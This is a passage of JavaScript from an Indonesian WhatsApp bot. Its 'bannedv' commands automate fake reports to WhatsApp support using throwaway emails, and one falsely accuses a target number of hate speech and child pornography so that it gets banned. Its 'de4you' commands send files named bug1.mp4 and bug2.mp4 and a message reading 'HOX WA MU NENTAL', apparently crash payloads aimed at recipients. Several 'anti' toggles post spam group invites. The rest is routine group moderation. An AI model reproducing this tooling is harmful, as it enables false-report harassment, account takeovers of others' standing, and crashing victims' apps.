form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا ، يرجى إلغاء تنشيط هذا الرقم ، لأنني فقدت هاتفي وشخص ما يستخدم رقمي ، يرجى إلغاء تنشيط رقمي")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "bannedv6": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Esse número vem fazendo discurso ao ódio e divulgado conteúdo de porno infantil Numero")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv1": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Hello WhatsApp team, recently my WhatsApp number was suddenly blocked and I couldnt log into my account, in my account there is an important group like a school group and I have to read it but the account My WhatsApp is suddenly blocked, please restore my numbers")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv2": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Equipe, o sistema de vocês baniram meu número por engano. Peço que vocês reativem meu número pois tenho família em outro país e preciso me comunicar com eles")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv3": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Kepada pihak WhatsApp yang bijak Sana kenapa akun WhatsApp saya terblokir padahal aktifitas WhatsApp messenger saya normal normal saja mohon dibukakan kembali akun WhatsApp saya dengan ini saya cantumkan kode nomor akun WhatsApp messenger saya sekian banyak Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv4": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا whatsapp ، تم حظر حسابي بشكل دائم أو مؤقت ، يرجى إلغاء حظر حسابي\nالرقم")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "unbannedv5": {
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285798145596`)
prrkek = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", prrkek)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Halo pak, Akun Whatsapp Saya diblokir Saya Maaf Saya Telah Menginstal Aplikasi Pihak Ketiga Secara Tidak Sengaja. Harap Buka Blokir Akun Saya Sesegera Mungkin. Terimakasih")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
Biiofc.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case "linkgc": case "linkgroup":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
const url = await Biiofc.groupInviteCode(m.chat)
const asu = "https://chat.whatsapp.com/" + url
reply(asu)
}
break
case "hidetag": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (!q) return reply(`Teks?`)
global.hit = q
Biiofc.sendMessage(from, { text : global.hit ? global.hit : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case "add": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
if (!m.isGroup) return reply(mess.group)
if (!isBotAdmins) return reply(mess.botAdmin)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Biiofc.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case "kick": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Biiofc.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
case 'promote': {
		if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await Biiofc.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply('*_Sukses Promote Yatim Piatu_*✅')).catch((err) => reply('*_❌ Terjadi Kesalahan_*'))
	}
	break
case 'demote': {
		if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await Biiofc.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply('*_Sukses Demote Yatim Piatu✅_*')).catch((err) => reply('*_❌ Terjadi Kesalahan_*'))
	}
	break
case 'de4you2': { 
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
joauuuuuuu = fs.readFileSync('./freya/bug1.mp4')
Biiofc.sendMessage(m.chat, {video: joauuuuuuu, caption:`selamat datang`,viewOnce : true},{quoted:m })
}
break
case 'de4you1':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
  Biiofc.sendMessage(from, {
    'text': 'HOX WA MU NENTAL'
  }, {
    'quoted': lep
  })
  }
  break
case 'de4you3': { 
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)
joauuuuuuu = fs.readFileSync('./freya/bug2.mp4')
Biiofc.sendMessage(m.chat, {video: joauuuuuuu, caption:`selamat datang`,viewOnce : true},{quoted:m })
}
break
case 'antivirus': case 'antivirtex': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antivirus) return reply('Sukses Mengaktifikan Tuan✅')
antivirus.push(from)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(antivirus))
reply('Success in turning on antivirus in this group')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Biiofc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNo body is allowed to send virus in this group, member who send will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antivirus) return reply('Sukses Menonaktifkan Tuan✅')
let off = antivirus.indexOf(from)
antivirus.splice(off, 1)
fs.writeFileSync('./database/antivirus.json', JSON.stringify(antivirus))
reply('Success in turning off antivirus this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antilinkinstagram': case 'antilinkig': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antilinkinstagram) return reply('Sukses Mengaktifikan Tuan✅')
antilinkinstagram.push(from)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(antilinkinstagram))
reply('Success in turning on instagram antilink in this group')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Biiofc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the instagram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antilinkinstagram) return reply('Sukses Menonaktifkan Tuan✅')
let off = antilinkinstagram.indexOf(from)
antilinkinstagram.splice(off, 1)
fs.writeFileSync('./database/antilinkinstagram.json', JSON.stringify(antilinkinstagram))
reply('Success in turning off instagram antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antilinkfacebook': case 'antilinkfb': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antilinkfacebook) return reply('Sukses Mengaktifikan Tuan✅')
antilinkfacebook.push(from)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(antilinkfacebook))
reply('Success in turning on facebook antilink in this group')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Biiofc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the facebook link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antilinkfacebook) return reply('Sukses Menonaktifkan Tuan✅')
let off = antilinkfacebook.indexOf(from)
antilinkfacebook.splice(off, 1)
fs.writeFileSync('./database/antilinkfacebook.json', JSON.stringify(ntilinkfb))
reply('Success in turning off facebook antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antilinktelegram': case 'antilinktg': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antilinktelegram) return reply('Sukses Mengaktifikan Tuan✅')
antilinktelegram.push(from)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(antilinktelegram))
reply('Success in turning on telegram antilink in this group')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Biiofc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the telegram link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antilinktelegram) return reply('Sukses Menonaktifkan Tuan✅')
let off = antilinktelegram.indexOf(from)
antilinktelegram.splice(off, 1)
fs.writeFileSync('./database/antilinktelegram.json', JSON.stringify(antilinktelegram))
reply('Success in turning off telegram antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antilinktiktok': case 'antilinktt': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antilinktiktok) return reply('Sukses Mengaktifikan Tuan✅')
antilinktiktok.push(from)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(antilinktiktok))
reply('Success in turning on tiktok antilink in this group')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Biiofc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the tiktok link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antilinktiktok) return reply('Sukses Menonaktifkan Tuan✅')
let off = antilinktiktok.indexOf(from)
antilinktiktok.splice(off, 1)
fs.writeFileSync('./database/antilinktiktok.json', JSON.stringify(antilinktiktok))
reply('Success in turning off tiktok antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antilinktwitter': case 'antilinktwit': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antilinktwitter) return reply('Sukses Mengaktifikan Tuan✅')
antilinktwitter.push(from)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(antilinktwitter))
reply('Success in turning on twitter antilink in this group')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Biiofc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the twitter link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antilinktwitter) return reply('Sukses Menonaktifkan Tuan✅')
let off = antilinktwitter.indexOf(from)
antilinktwitter.splice(off, 1)
fs.writeFileSync('./database/antilinktwitter.json', JSON.stringify(antilinktwitter))
reply('Success in turning off twitter antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antiwame': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antiwame) return reply('Sukses Mengaktifikan Tuan✅')
antiwame.push(from)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame))
reply('Success in turning on antiwame in this group')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Biiofc.sendMessage(from, {text: `\`\`\`JOIN GUYS 850 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiwame) return reply('Sukses Menonaktifkan Tuan✅')
let off = antiwame.indexOf(from)
antiwame.splice(off, 1)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame))
reply('Success in turning off antiwame in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antipromosi': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antipromosi) return reply('Sukses Mengaktifikan Tuan✅')
antipromosi.push(from)
fs.writeFileSync('./database/antipromosi.json', JSON.stringify(antipromosi))
reply('Success in turning on antipromosi in this group')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Biiofc.sendMessage(from, {text: `\`\`\`JOIN GUYS 850 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antipromosi) return reply('Sukses Menonaktifkan Tuan✅')
let off = antipromosi.indexOf(from)
antipromosi.splice(off, 1)
fs.writeFileSync('./database/antipromosi.json', JSON.stringify(antipromosi))
reply('Success in turning off antipromosi in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
              case 'antilinkall': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antilinkall) return reply('Sukses Mengaktifikan Tuan✅')
antilinkall.push(from)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(antilinkall))
reply('Success in turning on all antilink in this group')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Biiofc.sendMessage(from, {text: `\`\`\`JOIN GUYS 850 MEMBER MAU BERBAGI VPS AND ADMIN PANEL\`\`\`\n\nhttps://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antilinkall) return reply('Sukses Menonaktifkan Tuan✅')
let off = antilinkall.indexOf(from)
antilinkall.splice(off, 1)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(antilinkall))
reply('Success in turning off all antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'antilinkytvid': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (antilinkytvideo) return reply('Sukses Mengaktifikan Tuan✅')
antilinkytvideo.push(from)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(antilinkytvideo))
reply('Success in turning on youtube video antilink in this group')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
Biiofc.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send the youtube video link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antilinkytvideo) return reply('Sukses Menonaktifkan Tuan✅')
let off = antilinkytvideo.indexOf(from)
antilinkytvideo.splice(off, 1)
fs.writeFileSync('./database/antilinkytvideo.json', JSON.stringify(antilinkytvideo))
reply('Success in turning off youtube video antilink in this group')
} else {
  await reply(`Please Type The Option\n\nExample: ${prefix + command} on\nExample: ${prefix + command} off\n\non to enable\noff to disable`)
  }
  }
  break
case 'autojpm': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply(mess.only.badmin)
if (args[0] === "on") {
if (autojpm) return reply('Sukses Mengaktifikan Tuan✅')
autojpm.push(from)
fs.writeFileSync('./database/autojpm.json', JSON.stringify(autojpm))
reply('Success in turning on autojpm in this group')
var groupe = await Biiofc.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
